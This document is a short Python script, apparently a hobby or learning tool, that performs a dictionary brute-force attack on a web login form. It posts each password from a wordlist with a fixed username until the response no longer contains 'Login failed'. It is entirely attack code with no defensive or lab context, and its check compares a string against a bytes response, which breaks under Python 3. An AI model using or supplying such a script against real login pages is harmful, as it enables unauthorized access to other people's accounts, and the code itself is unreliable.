#!/usr/bin/env python3
import requests


target_url=""
# get the keys from the website login form
data={"username":"fff","password":"","Login":"submit"}




with open("path_to_password_file","r")  as wordlist_file:
    for line in wordlist_file:
        word=line.strip()
        # parse all passwords from the file into data and into response
        data["password"]=word
        response = requests.post(target_url, data=data)
        if "Login failed" not in response.content:
            print("[+] Password is :" +word)
            exit()
print("[+] Reached EOL")